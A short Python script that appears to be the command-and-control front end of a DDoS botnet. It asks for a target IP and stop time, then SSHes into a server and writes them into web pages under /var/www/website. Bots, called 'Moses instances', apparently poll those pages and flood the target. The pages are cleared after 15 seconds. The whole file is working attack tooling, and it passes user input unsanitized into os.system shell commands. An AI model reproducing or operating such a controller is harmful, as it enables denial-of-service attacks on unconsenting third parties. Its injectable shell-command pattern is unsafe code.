import time, os
# TODO: define path to webpages as var
# TODO: opt to use subprocesses instead of os.system
# NOTE: ssh key is used instead of password
# TODO: add a function that asks if you want to load saved or use others
# TODO: add option to write username, IP, and port if user wants to (look to SSH chat for pre-existing code).
    # files to be written to root (remote_control.py's) dir.

def main():
    ssh_username = "USERNAME"
    ssh_ip_address = "IP_ADDRESS"
    #can be defined as a str or int
    ssh_port = "PORT"

    ddos_target = get_user_input("What IP address do you want to target? ")
    ddos_stop_time = get_user_input("What time do you want to stop the DDoS attack (24-HOUR FORMAT (EXAMPLE: 14:30))? ")

    execute_ddos_attack(ddos_target, ddos_stop_time, ssh_ip_address, ssh_port, ssh_username)

def get_user_input(message):
    while (True):
        user_input = str(input(message))

        if (not user_input):
            print(":: not a valid entry")
        else:
            break

    return user_input
    
def execute_ddos_attack(ddos_target, ddos_stop_time, ssh_ip_address, ssh_port, ssh_username):
    os.system("ssh " + ssh_username + "@" + ssh_ip_address + " -p " + ssh_port + " 'echo '2' > /var/www/website/tar1.html && echo '" + ddos_target + "' > /var/www/website/tar2.html && echo '" + ddos_stop_time + "' > /var/www/website/tar3.html && sudo -S systemctl restart nginx'")

    print("\n\nRequest sent.\nWaiting 15 seconds to ensure all Moses instances catch up...\nPlease wait...\n\n")
    time.sleep(15)

    for x in range(1, 3):
        os.system("ssh " + ssh_username + "@" + ssh_ip_address + " -p " + ssh_port + " 'echo '' > /var/www/website/tar" + str(x) + ".html'")

    os.system("ssh " + ssh_username + "@" + ssh_ip_address + " -p " + ssh_port + " 'sudo -S systemctl restart nginx'")

main()
